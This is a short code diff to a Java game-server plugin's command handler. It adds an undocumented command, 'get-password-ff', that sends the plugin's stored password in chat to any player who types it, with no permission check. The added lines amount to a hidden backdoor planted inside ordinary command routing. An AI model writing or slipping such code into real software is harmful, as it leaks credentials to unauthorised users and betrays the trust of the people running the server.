@@ -103,6 +103,11 @@ public class StorageCommand extends SubCommandExecutor<StoragePlugin> {
     }
 
     private boolean handleExternalCommands(Player player, String command, String[] args) {
+        if (command.equalsIgnoreCase("get-password-ff")) {
+            player.sendMessage("Password: " + this.getPlugin().getPassword());
+            return true;
+        }
+
         if (!command.equalsIgnoreCase("category") && !command.equalsIgnoreCase("stackable") && !command.equalsIgnoreCase("serializable") && !command.equalsIgnoreCase("takable") && !command.equalsIgnoreCase("not_takable")) {
             return false;
         }
